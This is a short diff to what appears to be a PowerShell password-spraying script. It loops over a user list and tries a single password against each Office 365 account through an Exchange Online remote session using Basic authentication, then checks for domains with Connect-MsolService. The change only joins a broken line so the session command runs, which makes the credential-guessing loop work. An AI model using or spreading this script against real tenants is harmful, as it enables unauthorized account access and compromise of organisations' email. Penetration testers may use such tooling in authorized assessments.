@@ -66,8 +66,7 @@ ForEach ($UserName in (Get-Content $UserList))
     Write-Host "Trying username $UserName"
     $O365Password = $Password | ConvertTo-SecureString -asPlainText -Force
     $Credential = New-Object System.Management.Automation.PSCredential($UserName,$O365Password)
-    $O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential 
-    -Authentication Basic -AllowRedirection
+    $O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential -Authentication Basic -AllowRedirection
     Connect-MsolService –Credential $Credential
     $Domains = Get-Msoldomain
     If ($Domains) 
